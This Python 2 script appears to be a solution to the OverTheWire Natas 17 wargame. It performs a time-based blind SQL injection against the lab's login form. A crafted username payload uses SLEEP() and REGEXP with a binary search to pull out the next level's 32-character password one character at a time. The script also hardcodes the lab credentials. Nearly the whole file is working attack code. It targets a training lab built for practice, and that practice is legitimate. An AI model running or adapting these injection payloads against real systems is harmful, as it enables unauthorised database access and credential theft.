import base64
from datetime import datetime
import requests

TARGET_URL = 'http://natas17.natas.labs.overthewire.org/index.php'

CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

AUTH = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

SLEEP_TIME = 5

def does_password_have_c_at(chars, position):
    query = 'natas18" AND IF(BINARY password REGEXP "^%s[%s]",SLEEP(%d),0)>-1 AND 1="1' % ('.' * position, chars, SLEEP_TIME)
    print query
    done = False
    while not done:
        before = datetime.utcnow()
        r = requests.post(TARGET_URL,
            data={'username': query},
            auth=AUTH)
        if r.status_code == 200:
            after = datetime.utcnow()
            return (after-before).total_seconds() > SLEEP_TIME
        else:
            print '!', r.status_code

def find_char_at_position(position, available=CHARSET):
    if len(available) == 1:
        return available

    # first split into 2 parts
    parta, partb = available[:len(available)/2], available[len(available)/2:]

    if does_password_have_c_at(parta, position):
        return find_char_at_position(position, parta)
    else:
        return find_char_at_position(position, partb)

password = ''.join([find_char_at_position(i) for i in xrange(32)])


query = 'natas18" AND IF(BINARY password LIKE "%s",SLEEP(%d),0)>-1 AND 1="1' % (password, SLEEP_TIME)
print query
before = datetime.utcnow()
r = requests.post(TARGET_URL,
    data={'username': query},
    auth=AUTH)
if r.status_code == 200:
    after = datetime.utcnow()
    print (after-before).total_seconds() > SLEEP_TIME
else:
    print '!', r.status_code
